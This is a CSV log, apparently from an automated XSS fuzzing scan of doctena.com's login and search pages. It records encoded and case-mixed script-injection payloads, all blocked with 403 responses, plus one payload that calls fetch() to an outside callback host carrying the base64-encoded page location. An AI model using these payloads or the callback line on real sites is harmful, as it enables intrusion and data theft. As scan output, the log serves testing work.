url,param,payload,server_type,method,response_code,response_time,response_pattern,success,content_snippet,vulnerable,injection_context,nlp_forms_found,nlp_inputs_count,nlp_scripts_found,nlp_has_eval_or_write,nlp_has_sanitization_patterns,nlp_reflected_location_type,fuzz_num_filtered,fuzz_num_encoded
https://secure.doctena.com/security,_csrf,%3CDIV%20STYLE%3D%22width%3A%20expression%28alert%28%27XSS%27%29%29%3B%22%3E,generic,POST,403,2.142788887023926,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,generic,0,0,1,0,0,none,12,0
https://secure.doctena.com/security,username,"<iMG sRc="""">",generic,POST,403,2.092613935470581,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,generic,0,0,1,0,0,none,12,0
https://secure.doctena.com/security,password,"<a href=""javascript:eval('alert(\'XSS\')')"">Click Me</a>",generic,POST,403,2.077195405960083,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,generic,0,0,1,0,0,none,12,0
https://secure.doctena.com/security,_spring_security_remember_me,"<!--#exec cMD=""/biN/echO '<scR'+'Ipt>aLERT(""XsS"")</scr'+'Ipt>'""-->",generic,POST,403,2.091137409210205,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,generic,0,0,1,0,0,none,12,0
https://www.doctena.com/en-ch/,s,"&#x3c;form action=""javascript:alert('XSS')""&#x3e;&#x3c;input type=""submit""&#x3e;&#x3c;/form&#x3e;",generic,GET,403,2.1906726360321045,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,generic,0,0,1,0,0,none,0,0
https://www.doctena.com/en-ch/,post_type[],%3Ca%20foo%3Da%20src%3D%22javascript%3Aalert%28%27XSS%27%29%22%3EClick%20Me%3C/a%3E,generic,GET,403,2.0850837230682373,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,generic,0,0,1,0,0,none,0,0
https://www.doctena.com/en-ch/,search_limit_to_post_titles,%3Cimg%20foo%3Da%20src%3D%22javascript%3Aalert%28%27XSS%27%29%22%3E,generic,GET,403,2.066937208175659,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,generic,0,0,1,0,0,none,0,0
https://www.doctena.com/en-ch/,add_woo_product_skus,&#34><img src=x onerror=al	ert(1)('XSS')>,generic,GET,403,2.0841856002807617,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,generic,0,0,1,0,0,none,0,0
https://www.doctena.com/de/,s,%27%3B%20alert%28String.fromCharCode%2888%2C83%2C83%29%29//%27%3B%20alert%28String.fromCharCode%2888%2C83%2C83%29%29//%22%3B%20alert%28String.fromCharCode%2888%2C83%2C83%29%29//%22%3B%20alert%28String.fromCharCode%2888%2C83%2C83%29%29//--%3E%3C/SCRIPT%3E%22%3E%27%3B%20alert%28String.fromCharCode%2888%2C83%2C83%29%29//%27%3B%20alert%28String.fromCharCode%2888%2C83%2C83%29%29//%22%3B%20alert%28String.fromCharCode%2888%2C83%2C83%29%29//%22%3B%20alert%28String.fromCharCode%2888%2C83%2C83%29%29//--%3E%3C/SCRIPT%3E,generic,GET,403,2.1567587852478027,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,generic,0,0,1,0,0,none,0,0
https://www.doctena.com/en-be/,s,&#34;&#x3e;&#x3c;img src=x onerror=alert('XSS')&#x3e;,generic,GET,403,2.1914165019989014,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,generic,0,0,1,0,0,none,0,0
https://www.doctena.com/en-ch/,fs,"JAVaSCript:evaL(""ALert('XSS')"")",generic,GET,403,2.067675828933716,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,generic,0,0,1,0,0,none,0,0
https://www.doctena.com/de/,post_type[],"<a foo=A SRc=""javAscRIpt:aLERt('XSS')"">cLICK mE</a>",generic,GET,403,2.0657293796539307,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,generic,0,0,1,0,0,none,0,0
https://www.doctena.com/en-be/,post_type[],"&#x3c;a href=""javascript:alert('XSS')""&#x3e;Click Me&#x3c;/a&#x3e;",generic,GET,403,2.0674588680267334,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,generic,0,0,1,0,0,none,0,0
https://www.doctena.com/nl/,s,"<IMg srC=""VBsCRipT:alERt('xsS')"">",generic,GET,403,2.0674970149993896,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,generic,0,0,1,0,0,none,0,0
https://www.doctena.com/de/,search_limit_to_post_titles,%3Ca%20foo%3Da%20src%3D%22javascript%3Aalert%28%27XSS%27%29%22%3EClick%20Me%3C/a%3E,generic,GET,403,2.06954288482666,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,generic,0,0,1,0,0,none,0,0
https://www.doctena.com/en-be/,search_limit_to_post_titles,"<script>al	ert(1)(""XSS"")</script>",generic,GET,403,2.0645904541015625,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,generic,0,0,1,0,0,none,0,0
https://www.doctena.com/nl/,post_type[],%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E,generic,GET,403,2.047053337097168,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,generic,0,0,1,0,0,none,0,0
https://www.doctena.com/de/,add_woo_product_skus,<ScrIpt>fetch('//65RpAVzptmNd.oaST.prO/ScRipt?LoC='+btoA(WiNDOw.Location))</ScRIpT>,generic,GET,403,2.0573928356170654,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,generic,0,0,1,0,0,none,0,0
https://www.doctena.com/en-be/,add_woo_product_skus,"&#x3c;DIV STYLE=""width: expression(alert('XSS'));""&#x3e;",generic,GET,403,2.1402828693389893,"<html><head>
	<title>403 Forbidden</title>
	<style>
		html {
			font-family: ""Helvetica Neue"", Helve",0,"<html><head>
	<title>403 Forbidden</title>
	<style>
		html {
			font-family: ""Helvetica Neue"", Helve",0,generic,0,0,1,1,0,none,0,0
https://www.doctena.com/nl/,search_limit_to_post_titles,"&#x3c;BASE HREF=""javascript:alert('XSS');//""&#x3e;",generic,GET,403,2.0995984077453613,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,generic,0,0,1,0,0,none,0,0
